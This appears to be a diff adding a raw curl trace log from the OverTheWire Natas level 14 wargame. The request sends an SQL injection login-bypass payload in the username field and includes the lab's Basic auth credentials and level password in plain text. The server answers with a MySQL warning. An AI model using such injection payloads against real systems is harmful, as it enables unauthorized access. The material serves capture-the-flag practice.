@@ -1,0 +1,65 @@
+== Info: Rebuilt URL to: GET/
+== Info: Could not resolve host: GET
+== Info: Closing connection 0
+== Info:   Trying 176.9.9.172...
+== Info: TCP_NODELAY set
+== Info: Connected to natas14.natas.labs.overthewire.org (176.9.9.172) port 80 (#1)
+== Info: Server auth using Basic with user 'natas14'
+=> Send header, 247 bytes (0xf7)
+0000: POST / HTTP/1.1
+0011: Host: natas14.natas.labs.overthewire.org
+003b: Authorization: Basic bmF0YXMxNDpMZzk2TTEwVGRmYVB5VkJrSmRqeW1ibGx
+007b: RNUw2cWRsMQ==
+008a: User-Agent: curl/7.55.1
+00a3: Accept: */*
+00b0: Content-Length: 38
+00c4: Content-Type: application/x-www-form-urlencoded
+00f5: 
+=> Send data, 38 bytes (0x26)
+0000: username=" OR 1=1 --&password=&debug=1
+== Info: upload completely sent off: 38 out of 38 bytes
+<= Recv header, 17 bytes (0x11)
+0000: HTTP/1.1 200 OK
+<= Recv header, 37 bytes (0x25)
+0000: Date: Thu, 02 Nov 2017 07:16:01 GMT
+<= Recv header, 32 bytes (0x20)
+0000: Server: Apache/2.4.10 (Debian)
+<= Recv header, 23 bytes (0x17)
+0000: Vary: Accept-Encoding
+<= Recv header, 22 bytes (0x16)
+0000: Content-Length: 1085
+<= Recv header, 40 bytes (0x28)
+0000: Content-Type: text/html; charset=UTF-8
+<= Recv header, 2 bytes (0x2)
+0000: 
+<= Recv data, 1085 bytes (0x43d)
+0000: <html>
+0008: <head>
+0010: <!-- This stuff in the header has nothing to do with the level -
+0050: ->
+0054: <link rel="stylesheet" type="text/css" href="http://natas.labs.o
+0094: verthewire.org/css/level.css">
+00b4: <link rel="stylesheet" href="http://natas.labs.overthewire.org/c
+00f4: ss/jquery-ui.css" />
+010a: <link rel="stylesheet" href="http://natas.labs.overthewire.org/c
+014a: ss/wechall.css" />
+015e: <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.j
+019e: s"></script>
+01ac: <script src="http://natas.labs.overthewire.org/js/jquery-ui.js">
+01ec: </script>
+01f7: <script src=http://natas.labs.overthewire.org/js/wechall-data.js
+0237: ></script><script src="http://natas.labs.overthewire.org/js/wech
+0277: all.js"></script>
+028a: <script>var wechallinfo = { "level": "natas14", "pass": "Lg96M10
+02ca: TdfaPyVBkJdjymbllQ5L6qdl1" };</script></head>
+02f9: <body>
+0301: <h1>natas14</h1>
+0313: <div id="content">
+0327: <br />.<b>Warning</b>:  mysql_num_rows() expects parameter 1 to 
+0367: be resource, boolean given in <b>/var/www/natas/natas14/index.ph
+03a7: p</b> on line <b>24</b><br />.Access denied!<br><div id="viewsou
+03e7: rce"><a href="index-source.html">View sourcecode</a></div>
+0423: </div>
+042b: </body>
+0434: </html>
+== Info: Connection #1 to host natas14.natas.labs.overthewire.org left intact
